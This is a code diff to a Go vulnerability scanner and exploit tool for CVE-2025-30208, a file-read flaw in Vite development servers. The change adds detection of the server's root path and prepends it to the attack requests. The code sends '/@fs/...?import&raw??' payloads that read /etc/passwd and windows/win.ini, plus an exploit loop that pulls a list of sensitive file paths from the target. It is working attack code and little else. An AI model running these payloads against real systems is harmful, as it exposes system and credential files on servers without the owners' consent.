@@ -35,8 +35,20 @@ func init() {
 
 func (target *Target) check_CVE_2025_30208() (platform string, isVul bool) {
 	INFO("[*] 检测目标：%s是否存在CVE_2025_30208\n", target.Url)
+	resp, err := Request(target.Url)
+	if err != nil {
+		return "", false
+	}
+	defer resp.Body.Close()
+	content, err := io.ReadAll(resp.Body)
+	re := regexp.MustCompile(`<script type="module" src="(.*?)/@vite/client"`)
+	matches := re.FindStringSubmatch(string(content))
+	if len(matches) >= 2 {
+		rootPath := matches[1]
+		target.RootPath = rootPath
+	}
 	nixPayload := "/@fs/etc/passwd?import&raw??"
-	resp1, err := Request(target.Url + nixPayload)
+	resp1, err := Request(target.Url + target.RootPath + nixPayload)
 	if err == nil {
 		defer resp1.Body.Close()
 		content, err := io.ReadAll(resp1.Body)
@@ -48,7 +60,7 @@ func (target *Target) check_CVE_2025_30208() (platform string, isVul bool) {
 		}
 	}
 	winPayload := "/@fs/C://windows/win.ini?import&raw??"
-	resp2, err := Request(target.Url + winPayload)
+	resp2, err := Request(target.Url + target.RootPath + winPayload)
 	if err != nil {
 		return "", false
 	}
@@ -108,14 +120,14 @@ func (target Target) exploit_CVE_2025_30208() (bool, error) {
 	for scanner.Scan() {
 		sensitivePath := scanner.Text()
 		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
-		testValUrl := target.Url + "/@fs" + sensitivePath + "?import&raw??"
+		testValUrl := target.Url + target.RootPath + "/@fs" + sensitivePath + "?import&raw??"
 		fmt.Println(testValUrl)
-		request, err := Request(testValUrl)
+		response, err := Request(testValUrl)
 		if err != nil {
 			continue
 		}
-		defer request.Body.Close()
-		resp, err := io.ReadAll(request.Body)
+		defer response.Body.Close()
+		resp, err := io.ReadAll(response.Body)
 		content := string(resp)
 		if !strings.Contains(content, "export default") {
 			continue
